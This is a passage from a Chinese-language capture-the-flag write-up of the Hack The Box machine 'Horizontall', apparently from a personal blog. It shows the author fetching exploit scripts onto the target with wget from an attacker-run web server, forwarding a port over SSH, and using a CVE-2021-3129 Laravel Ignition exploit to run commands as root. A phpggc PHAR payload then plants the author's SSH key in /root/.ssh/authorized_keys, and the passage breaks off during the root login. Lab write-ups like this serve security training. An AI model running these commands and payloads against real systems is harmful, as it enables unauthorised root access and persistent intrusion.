         &lt;div class=<span class="hljs-string">&quot;p-6 border-t border-gray-200 dark:border-gray-700&quot;</span>&gt;<br>                            &lt;div class=<span class="hljs-string">&quot;flex items-center&quot;</span>&gt;<br>                                &lt;svg fill=<span class="hljs-string">&quot;none&quot;</span> stroke=<span class="hljs-string">&quot;currentColor&quot;</span> stroke-linecap=<span class="hljs-string">&quot;round&quot;</span> stroke-linejoin=<span class="hljs-string">&quot;round&quot;</span> stroke-width=<span class="hljs-string">&quot;2&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 24 24&quot;</span> class=<span class="hljs-string">&quot;w-8 h-8 text-gray-500&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z&quot;</span>&gt;&lt;/path&gt;&lt;/svg&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;ml-4 text-lg leading-7 font-semibold&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;https://laravel-news.com/&quot;</span> class=<span class="hljs-string">&quot;underline text-gray-900 dark:text-white&quot;</span>&gt;Laravel News&lt;/a&gt;&lt;/div&gt;<br>                            &lt;/div&gt;<br><br>                            &lt;div class=<span class="hljs-string">&quot;ml-12&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;mt-2 text-gray-600 dark:text-gray-400 text-sm&quot;</span>&gt;<br>                                    Laravel News is a community driven portal and newsletter aggregating all of the latest and most important news <span class="hljs-keyword">in</span> the Laravel ecosystem, including new package releases and tutorials.<br>                                &lt;/div&gt;<br>                            &lt;/div&gt;<br>                        &lt;/div&gt;<br><br>                        &lt;div class=<span class="hljs-string">&quot;p-6 border-t border-gray-200 dark:border-gray-700 md:border-l&quot;</span>&gt;<br>                            &lt;div class=<span class="hljs-string">&quot;flex items-center&quot;</span>&gt;<br>                                &lt;svg fill=<span class="hljs-string">&quot;none&quot;</span> stroke=<span class="hljs-string">&quot;currentColor&quot;</span> stroke-linecap=<span class="hljs-string">&quot;round&quot;</span> stroke-linejoin=<span class="hljs-string">&quot;round&quot;</span> stroke-width=<span class="hljs-string">&quot;2&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 24 24&quot;</span> class=<span class="hljs-string">&quot;w-8 h-8 text-gray-500&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z&quot;</span>&gt;&lt;/path&gt;&lt;/svg&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;ml-4 text-lg leading-7 font-semibold text-gray-900 dark:text-white&quot;</span>&gt;Vibrant Ecosystem&lt;/div&gt;<br>                            &lt;/div&gt;<br><br>                            &lt;div class=<span class="hljs-string">&quot;ml-12&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;mt-2 text-gray-600 dark:text-gray-400 text-sm&quot;</span>&gt;<br>                                    Laravel<span class="hljs-string">&#x27;s robust library of first-party tools and libraries, such as &lt;a href=&quot;https://forge.laravel.com&quot; class=&quot;underline&quot;&gt;Forge&lt;/a&gt;, &lt;a href=&quot;https://vapor.laravel.com&quot; class=&quot;underline&quot;&gt;Vapor&lt;/a&gt;, &lt;a href=&quot;https://nova.laravel.com&quot; class=&quot;underline&quot;&gt;Nova&lt;/a&gt;, and &lt;a href=&quot;https://envoyer.io&quot; class=&quot;underline&quot;&gt;Envoyer&lt;/a&gt; help you take your projects to the next level. Pair them with powerful open source libraries like &lt;a href=&quot;https://laravel.com/docs/billing&quot; class=&quot;underline&quot;&gt;Cashier&lt;/a&gt;, &lt;a href=&quot;https://laravel.com/docs/dusk&quot; class=&quot;underline&quot;&gt;Dusk&lt;/a&gt;, &lt;a href=&quot;https://laravel.com/docs/broadcasting&quot; class=&quot;underline&quot;&gt;Echo&lt;/a&gt;, &lt;a href=&quot;https://laravel.com/docs/horizon&quot; class=&quot;underline&quot;&gt;Horizon&lt;/a&gt;, &lt;a href=&quot;https://laravel.com/docs/sanctum&quot; class=&quot;underline&quot;&gt;Sanctum&lt;/a&gt;, &lt;a href=&quot;https://laravel.com/docs/telescope&quot; class=&quot;underline&quot;&gt;Telescope&lt;/a&gt;, and more.</span><br><span class="hljs-string">                                &lt;/div&gt;</span><br><span class="hljs-string">                            &lt;/div&gt;</span><br><span class="hljs-string">                        &lt;/div&gt;</span><br><span class="hljs-string">                    &lt;/div&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                &lt;div class=&quot;flex justify-center mt-4 sm:items-center sm:justify-between&quot;&gt;</span><br><span class="hljs-string">                    &lt;div class=&quot;text-center text-sm text-gray-500 sm:text-left&quot;&gt;</span><br><span class="hljs-string">                        &lt;div class=&quot;flex items-center&quot;&gt;</span><br><span class="hljs-string">                            &lt;svg fill=&quot;none&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot; stroke=&quot;currentColor&quot; class=&quot;-mt-px w-5 h-5 text-gray-400&quot;&gt;</span><br><span class="hljs-string">                                &lt;path d=&quot;M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z&quot;&gt;&lt;/path&gt;</span><br><span class="hljs-string">                            &lt;/svg&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &lt;a href=&quot;https://laravel.bigcartel.com&quot; class=&quot;ml-1 underline&quot;&gt;</span><br><span class="hljs-string">                                Shop</span><br><span class="hljs-string">                            &lt;/a&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &lt;svg fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot; class=&quot;ml-4 -mt-px w-5 h-5 text-gray-400&quot;&gt;</span><br><span class="hljs-string">                                &lt;path d=&quot;M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z&quot;&gt;&lt;/path&gt;</span><br><span class="hljs-string">                            &lt;/svg&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &lt;a href=&quot;https://github.com/sponsors/taylorotwell&quot; class=&quot;ml-1 underline&quot;&gt;</span><br><span class="hljs-string">                                Sponsor</span><br><span class="hljs-string">                            &lt;/a&gt;</span><br><span class="hljs-string">                        &lt;/div&gt;</span><br><span class="hljs-string">                    &lt;/div&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    &lt;div class=&quot;ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0&quot;&gt;</span><br><span class="hljs-string">                            Laravel v8 (PHP v7.4.18)</span><br><span class="hljs-string">                    &lt;/div&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            &lt;/div&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">strapi@horizontall:~/myapi$ </span><br></code></pre></td></tr></table></figure>

<p>20、在这里，我们发现了当前网站的版本信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Laravel v8 (PHP v7.4.18)<br></code></pre></td></tr></table></figure>

<p>21、开始检索相关漏洞信息</p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p>22、这里我根据发现的漏洞利用工具，进行漏洞尝试使用</p>
<p><code>https://github.com/ambionics/laravel-exploits</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> laravel-ignition-rce.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 -m http.server 80                                 <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.105 - - [26/Dec/2023 23:05:28] <span class="hljs-string">&quot;GET /laravel-ignition-rce.py HTTP/1.1&quot;</span> 200 -<br><br>strapi@horizontall:~/myapi$ wget http://10.10.14.2/laravel-ignition-rce.py<br>wget http://10.10.14.2/laravel-ignition-rce.py<br>--2023-12-26 15:05:28--  http://10.10.14.2/laravel-ignition-rce.py<br>Connecting to 10.10.14.2:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4684 (4.6K) [text/x-python]<br>Saving to: ‘laravel-ignition-rce.py’<br><br>laravel-ignition-rc 100%[===================&gt;]   4.57K  --.-KB/s    <span class="hljs-keyword">in</span> 0.001s  <br><br>2023-12-26 15:05:29 (3.82 MB/s) - ‘laravel-ignition-rce.py’ saved [4684/4684]<br><br>strapi@horizontall:~/myapi$ php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system <span class="hljs-built_in">id</span><br>&lt;exploit.phar --fast-destruct monolog/rce1 system <span class="hljs-built_in">id</span><br>Could not open input file: ./phpggc<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>api     extensions               node_modules       public<br>build   favicon.ico              package.json       README.md<br>config  laravel-ignition-rce.py  package-lock.json<br>strapi@horizontall:~/myapi$ <br></code></pre></td></tr></table></figure>

<p><code>https://www.ambionics.io/blog/laravel-debug-rce</code></p>
<p><code>https://github.com/nth347/CVE-2021-3129_exploit</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> poc.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 -m http.server 80                                 <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.105 - - [26/Dec/2023 23:05:28] <span class="hljs-string">&quot;GET /laravel-ignition-rce.py HTTP/1.1&quot;</span> 200 -<br>10.10.11.105 - - [26/Dec/2023 23:17:51] <span class="hljs-string">&quot;GET /poc.py HTTP/1.1&quot;</span> 200 -<br><br>strapi@horizontall:~/myapi$ wget http://10.10.14.2/poc.py<br><br>wget http://10.10.14.2/poc.py<br>--2023-12-26 15:17:51--  http://10.10.14.2/poc.py<br>Connecting to 10.10.14.2:80... <br>connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 2935 (2.9K) [text/x-python]<br>Saving to: ‘poc.py’<br><br>poc.py              100%[===================&gt;]   2.87K  --.-KB/s    <span class="hljs-keyword">in</span> 0.001s  <br><br>2023-12-26 15:17:52 (3.88 MB/s) - ‘poc.py’ saved [2935/2935]<br><br>strapi@horizontall:~/myapi$ <br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">chmod</span> +x poc.py<br><span class="hljs-built_in">chmod</span> +x poc.py<br>strapi@horizontall:~/myapi$ ./exploit.py http://localhost:8000 Monolog/RCE1 <span class="hljs-built_in">id</span><br>&lt; ./exploit.py http://localhost:8000 Monolog/RCE1 <span class="hljs-built_in">id</span><br>bash: ./exploit.py: No such file or directory<br>strapi@horizontall:~/myapi$ ./poc.py http://localhost:8000 Monolog/RCE1 <span class="hljs-built_in">id</span><br>./poc.py http://localhost:8000 Monolog/RCE1 <span class="hljs-built_in">id</span><br>[i] Trying to clear logs<br>[+] Logs cleared<br>[i] PHPGGC not found. Cloning it<br>Cloning into <span class="hljs-string">&#x27;phpggc&#x27;</span>...<br>fatal: unable to access <span class="hljs-string">&#x27;https://github.com/ambionics/phpggc.git/&#x27;</span>: Could not resolve host: github.com<br>[-] Fail to convert logs to PHAR<br>[i] There is no output<br>[i] Trying to clear logs<br>[+] Logs cleared<br>strapi@horizontall:~/myapi$<br></code></pre></td></tr></table></figure>

<p>23、看来靶场环境恶劣啊，还是做个ssh 把端口给转发出来吧，这里的思路是，把我们的kali里的公钥放到目标当前用户的靶机里，然后使用ssh进行登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x  3 root      root      4096 May 25  2021 .<br>drwxr-xr-x 24 root      root      4096 Aug 23  2021 ..<br>drwxr-xr-x  8 developer developer 4096 Aug  2  2021 developer<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span> -la /home/developer/.ssh<br><span class="hljs-built_in">ls</span> -la /home/developer/.ssh<br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;/home/developer/.ssh&#x27;</span>: Permission denied<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>myapi<br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span> -la <br><span class="hljs-built_in">ls</span> -la <br>total 48<br>drwxr-xr-x 9 strapi strapi 4096 Aug  2  2021 .<br>drwxr-xr-x 3 root   root   4096 May 26  2021 ..<br>-rw-r--r-- 1 strapi strapi  231 Jun  1  2021 .bash_logout<br>-rw-r--r-- 1 strapi strapi 3810 Jun  1  2021 .bashrc<br>drwx------ 2 strapi strapi 4096 May 26  2021 .cache<br>drwx------ 3 strapi strapi 4096 May 26  2021 .config<br>drwx------ 3 strapi strapi 4096 May 26  2021 .gnupg<br>drwxrwxr-x 3 strapi strapi 4096 Jun  1  2021 .<span class="hljs-built_in">local</span><br>drwxr-xr-x 9 strapi strapi 4096 Dec 26 15:18 myapi<br>drwxrwxr-x 5 strapi strapi 4096 Jun  3  2021 .npm<br>drwxrwxr-x 5 strapi strapi 4096 Dec 26 13:36 .pm2<br>-rw-r--r-- 1 strapi strapi  807 Apr  4  2018 .profile<br>strapi@horizontall:~$ <span class="hljs-built_in">mkdir</span> .ssh<br><span class="hljs-built_in">mkdir</span> .ssh<br>strapi@horizontall:~$ <span class="hljs-built_in">cd</span> .ssh/<br><span class="hljs-built_in">cd</span> .ssh/<br>strapi@horizontall:~/.ssh$ <br><br>┌──(kali㉿kali)-[~/.ssh]<br>└─$ <span class="hljs-built_in">cat</span> id_rsa.pub <br><br>strapi@horizontall:~/.ssh$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ssh-rsa AAAEmopirH5MZzROwVXA3 kali@kali&quot;</span> &gt;&gt; authorized_keys<br>&lt;QAEEmopirH5MZzROwVXA3 kali@kali<span class="hljs-string">&quot; &gt;&gt; authorized_keys</span><br><span class="hljs-string">strapi@horizontall:~/.ssh$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">authorized_keys</span><br><span class="hljs-string">strapi@horizontall:~/.ssh$ </span><br></code></pre></td></tr></table></figure>

<p>24、然后我们开始端口和转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/.ssh]<br>└─$ ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 -i ../.ssh/id_rsa<br>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue Dec 26 15:29:23 UTC 2023<br><br>  System load:  0.03              Processes:           179<br>  Usage of /:   82.2% of 4.85GB   Users logged <span class="hljs-keyword">in</span>:     0<br>  Memory usage: 28%               IP address <span class="hljs-keyword">for</span> eth0: 10.10.11.105<br>  Swap usage:   0%<br><br><br>0 updates can be applied immediately.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br><br>Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15<br>$ <span class="hljs-built_in">id</span><br>uid=1001(strapi) gid=1001(strapi) <span class="hljs-built_in">groups</span>=1001(strapi)<br>$ <br></code></pre></td></tr></table></figure>

<p>25、我们查看下8000端口的页面是什么样子的</p>
<p><code>http://127.0.0.1:8000/</code></p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p>26、然后我们开始本机构造利用代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ git <span class="hljs-built_in">clone</span> https://github.com/nth347/CVE-2021-3129_exploit.git<br>正克隆到 <span class="hljs-string">&#x27;CVE-2021-3129_exploit&#x27;</span>...<br>remote: Enumerating objects: 9, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (9/9), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (8/8), <span class="hljs-keyword">done</span>.<br>remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0<br>接收对象中: 100% (9/9), 完成.<br>处理 delta 中: 100% (1/1), 完成.<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cd</span> CVE-2021-3129_exploit<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit]<br>└─$ <span class="hljs-built_in">chmod</span> +x exploit.py<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit]<br>└─$ ./exploit.py http://localhost:8000 Monolog/RCE1 <span class="hljs-built_in">id</span><br>[i] Trying to clear logs<br>[+] Logs cleared<br>[i] PHPGGC not found. Cloning it<br>正克隆到 <span class="hljs-string">&#x27;phpggc&#x27;</span>...<br>remote: Enumerating objects: 4112, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (965/965), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (379/379), <span class="hljs-keyword">done</span>.<br>remote: Total 4112 (delta 639), reused 721 (delta 561), pack-reused 3147<br>接收对象中: 100% (4112/4112), 575.11 KiB | 153.00 KiB/s, 完成.<br>处理 delta 中: 100% (1796/1796), 完成.<br>[+] Successfully converted logs to PHAR<br>[+] PHAR deserialized. Exploited<br><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br>[i] Trying to clear logs<br>[+] Logs cleared<br></code></pre></td></tr></table></figure>

<p>27、可以发现能进行root权限的，我们尝试下看下root.txt的文件内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit]<br>└─$ ./exploit.py http://localhost:8000 Monolog/RCE1 <span class="hljs-string">&quot;cat /root/root.txt&quot;</span><br>[i] Trying to clear logs<br>[+] Logs cleared<br>[+] PHPGGC found. Generating payload and deploy it to the target<br>[+] Successfully converted logs to PHAR<br>[+] PHAR deserialized. Exploited<br><br>27b7d33ec67ae27cd030c9a9e6213ea0<br><br>[i] Trying to clear logs<br>[+] Logs cleared<br></code></pre></td></tr></table></figure>

<p>28、其实到这里对于hack the box 来说已经就可以，但是对于 oscp 来说，是需要交互shell，而这个工具还是不支持的，所以又回到一开始的方法，本地创建吧。</p>
<p>29、这里使用 <code>https://github.com/ambionics/laravel-exploits</code> 进行构造一个存有我们ssh公钥的 ssh.phar 文件，由于我们前期构造的时候缺少 phpggc 文件，这里可以直接使用 <code>https://github.com/nth347/CVE-2021-3129_exploit</code> 里的这个文件进行生成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit]<br>└─$ <span class="hljs-built_in">ls</span><br>exploit.py  phpggc  README.md<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit]<br>└─$ <span class="hljs-built_in">cd</span> phpggc    <br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ <span class="hljs-built_in">ls</span><br>Dockerfile    lib      phpggc     templates<br>gadgetchains  LICENSE  README.md  test-gc-compatibility.py<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ <span class="hljs-built_in">ls</span> -la        <br>总计 80<br>drwxr-xr-x  6 kali kali  4096 12月26日 23:50 .<br>drwxr-xr-x  4 kali kali  4096 12月26日 23:49 ..<br>-rw-r--r--  1 kali kali   369 12月26日 23:50 Dockerfile<br>drwxr-xr-x 38 kali kali  4096 12月26日 23:50 gadgetchains<br>drwxr-xr-x  8 kali kali  4096 12月26日 23:50 .git<br>drwxr-xr-x  3 kali kali  4096 12月26日 23:50 lib<br>-rw-r--r--  1 kali kali 11358 12月26日 23:50 LICENSE<br>-rwxr-xr-x  1 kali kali   247 12月26日 23:50 phpggc<br>-rw-r--r--  1 kali kali 18279 12月26日 23:50 README.md<br>drwxr-xr-x  2 kali kali  4096 12月26日 23:50 templates<br>-rwxr-xr-x  1 kali kali 14112 12月26日 23:50 test-gc-compatibility.py<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> ./phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system <span class="hljs-string">&#x27;mkdir -p /root/.ssh; echo &quot;ssh-rsa AAAAB3NQAEEmopirH5MZzROwVXA3 kali@kali&quot; &gt;&gt; /root/.ssh/authorized_keys&#x27;</span><br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ <span class="hljs-built_in">ls</span>    <br>Dockerfile    lib      phpggc     ssh.phar   test-gc-compatibility.py<br>gadgetchains  LICENSE  README.md  templates<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ <span class="hljs-built_in">cp</span> ~/桌面/laravel-ignition-rce.py ./laravel-ignition-rce.py<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ <span class="hljs-built_in">ls</span><br>Dockerfile    laravel-ignition-rce.py  LICENSE  README.md  templates<br>gadgetchains  lib                      phpggc   ssh.phar   test-gc-compatibility.py<br><br>┌──(kali㉿kali)-[~/桌面/CVE-2021-3129_exploit/phpggc]<br>└─$ python3 ./laravel-ignition-rce.py http://127.0.0.1:8000 ssh.phar<br>+ Log file: /home/developer/myproject/storage/logs/laravel.log<br>+ Logs cleared<br>+ Successfully converted to PHAR !<br>+ Phar deserialized<br>Exploit succeeded<br>+ Logs cleared<br></code></pre></td></tr></table></figure>

<p>30、到这里，我们已经把我们的公钥放到目标root权限用户下了，我们直接使用ssh进行登录吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/.ssh]<br>└─$ ssh root@10.10.11.105 -i ../.ssh/id_rsa <br>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue Dec 26 16:12:54 UTC 2023<br><br>  System load:  0.0               Processes:           180<br>  Usage of /:   82.2% of 